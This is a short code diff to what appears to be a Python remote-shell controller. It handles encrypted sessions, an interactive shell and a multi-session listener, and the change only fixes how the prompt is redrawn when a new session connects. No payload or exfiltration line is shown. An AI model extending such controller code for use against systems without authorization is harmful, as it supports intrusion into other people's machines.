@@ -21,6 +21,7 @@ shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(
 terminator = ''.join((random.choice(string.letters)) for x in range(16))
 escrypt = ESEncryptor(shellKey,16)
 datadir = "data"
+inputhandle = ""
 sessions = {}
 
 #Mark: Mode
@@ -221,6 +222,8 @@ def lcd(command):
 #MARK: Interactive Shell
 
 def initSHELL(name,conn,host,port,CDA):
+    global inputhandle
+    inputhandle = name
     while 1:
         command = ""
         try:
@@ -570,6 +573,7 @@ class SessionHandler:
 #MARK: MultiServer
 
 def multiServer(host,port):
+    global inputhandle
     AMODE = "multi"
     x = 1
     strinfo("Starting Background Multi Server on "+str(port)+"...")
@@ -591,7 +595,7 @@ def multiServer(host,port):
             skip = 1
         if skip:
             continue
-        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] + WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
+        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] + WHITE+"\n"+inputhandle)
         sys.stdout.flush()
         x += 1
 
@@ -652,8 +656,10 @@ def multiServerHelp():
 
 def multiServerController(port,bgserver):
     AMODE = "multi"
+    global inputhandle
     while AMODE == "multi":
-        input = raw_input(WHITE+""+COLOR_INFO+"MultiSession"+WHITE+"> ")
+        inputhandle = COLOR_INFO+"MultiSession"+WHITE+"> "
+        input = raw_input(inputhandle)
         if not input:
             continue
         cmd = input.split()
